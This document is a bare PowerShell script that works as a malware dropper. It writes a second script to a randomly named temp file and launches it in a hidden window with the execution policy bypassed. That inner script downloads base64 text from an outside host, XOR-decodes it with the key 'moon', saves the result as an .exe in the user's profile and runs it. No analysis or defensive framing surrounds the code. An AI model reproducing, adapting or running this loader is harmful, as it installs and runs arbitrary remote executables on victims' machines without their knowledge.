$script = @'
try {
    $u = 'https://yodesapi.com/xorbin.txt'
    $k = 'moon'

    if (!$u) {
        throw 'Missing URL'
    }

    Add-Type 'using System.Net;public class D{public static string G(string u){using(var w=new WebClient())return w.DownloadString(u);}}'

    $b = [Convert]::FromBase64String(([D]::G($u) -replace '\s'))
    $x = [Text.Encoding]::UTF8.GetBytes($k)

    $o = [byte[]](0..($b.Length - 1) | ForEach-Object {
        $b[$_] -bxor $x[$_ % $x.Length]
    })

        $file = "$env:USERPROFILE\fhdsb.exe"
    [IO.File]::WriteAllBytes($file, $o)
    & $file



}
catch {
    Write-Host "Error: $($_.Exception.Message)"
}
'@

$tempPath = Join-Path $env:TEMP ("ps_" + [guid]::NewGuid().ToString('N') + ".ps1")

$script | Set-Content -LiteralPath $tempPath -Encoding UTF8

Write-Host "tempPath = [$tempPath]"
Write-Host "exists   = $(Test-Path -LiteralPath $tempPath)"

$psi = [System.Diagnostics.ProcessStartInfo]::new()
$psi.FileName = 'powershell.exe'
$psi.UseShellExecute = $false
$psi.CreateNoWindow = $true
$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden

$psi.ArgumentList.Add('-NoProfile')
$psi.ArgumentList.Add('-ExecutionPolicy')
$psi.ArgumentList.Add('Bypass')
$psi.ArgumentList.Add('-File')
$psi.ArgumentList.Add($tempPath)

$process = [System.Diagnostics.Process]::Start($psi)

Write-Host "Process started: $($process.Id)"

# No WaitForExit()
